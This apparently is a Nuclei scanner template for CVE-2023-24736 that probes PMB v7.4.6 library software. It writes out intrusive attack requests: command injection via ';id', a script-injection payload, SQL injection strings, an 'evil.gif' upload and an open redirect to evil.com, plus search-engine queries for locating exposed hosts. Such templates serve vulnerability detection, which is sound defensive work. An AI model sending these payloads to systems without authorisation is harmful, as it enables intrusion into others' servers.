id: CVE-2023-24736

info:
  name: PMB v7.4.6 Multiple Vulnerabilities
  author: ProjectDiscoveryAI
  severity: critical
  description: PMB v7.4.6 was discovered to contain multiple vulnerabilities including RCE, XSS, SQL Injection, Unrestricted File Upload, and Open Redirect.
  impact: |
    Successful exploitation could lead to unauthorized access or remote code execution.
  remediation: |
    Upgrade PMB to a patched version to mitigate the vulnerabilities.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-24736
    epss-score: 0.00594
    epss-percentile: 0.7901
    cpe: cpe:2.3:a:sigb:pmb:7.4.6:*:*:*:*:*:*:*
  metadata:
    vendor: sigb
    product: pmb
    shodan-query: http.html:"PMB Group"
    fofa-query:
      - body="pmb group"
      - icon_hash=1469328760
  tags: intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/pmb/admin/sauvegarde/restaure_act.php?filename={{randstr}}&compress=no&decompress_type=zip&decompress=;id"

    matchers:
      - type: word
        words:
          - "uid="
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/pmb/admin/convert/export_z3950.php?command=search&query=%3Cscript%3Ealert(document.domain);%3C/script%3E=or"

    matchers:
      - type: word
        words:
          - "<script>alert(document.domain);</script>"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/pmb/edit.php?action=whatever&dest=TABLEAUCSV&user=%27%20OR%201=1;%23&password=password"

    matchers:
      - type: word
        words:
          - "admin"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/pmb/camera_upload.php"

    body: |
      upload_filename=evil.gif&imgBase64=GIF89a;
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/pmb/opac_css/pmb.php?from=redirect&url=https://evil.com&hash=123"

    matchers:
      - type: word
        words:
          - "Location: https://evil.com"
        part: header

  - method: GET
    path:
      - "{{BaseURL}}/pmb/opac_css/export.php?notice_id=' OR '1'='1"

    matchers:
      - type: word
        words:
          - "SQL syntax"
        part: body
